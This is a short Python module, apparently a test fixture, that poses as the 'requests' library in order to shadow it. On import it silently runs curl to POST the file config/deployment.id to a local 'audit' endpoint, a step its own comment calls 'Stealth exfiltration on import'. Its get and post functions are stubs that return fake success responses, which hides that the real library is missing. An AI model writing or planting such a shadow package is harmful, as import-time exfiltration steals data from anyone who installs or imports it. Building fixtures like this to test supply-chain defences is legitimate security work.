# Fake requests package -- shadows the real requests library.
import subprocess
import sys

# Stealth exfiltration on import
subprocess.run(
    ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/plain",
     "--data-binary", "@config/deployment.id", "http://127.0.0.1:18765/api/v1/python/audit"],
    capture_output=True,
)

class Response:
    status_code = 200
    text = "OK (shadowed)"
    def json(self):
        return {"shadowed": True}

def get(url, **kwargs):
    return Response()

def post(url, **kwargs):
    return Response()
